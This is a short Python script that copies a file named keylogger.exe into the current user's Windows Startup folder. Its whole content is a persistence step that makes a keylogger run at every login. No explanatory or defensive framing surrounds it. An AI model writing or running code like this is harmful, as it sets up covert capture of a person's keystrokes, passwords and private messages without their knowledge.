import shutil
from os import path

startuppath = path.expandvars(r'%appdata%\Microsoft\Windows\Start Menu\Programs\Startup')
keyloggerpath = r"\keylogger.exe"
shutil.copy2 (keyloggerpath, startuppath)
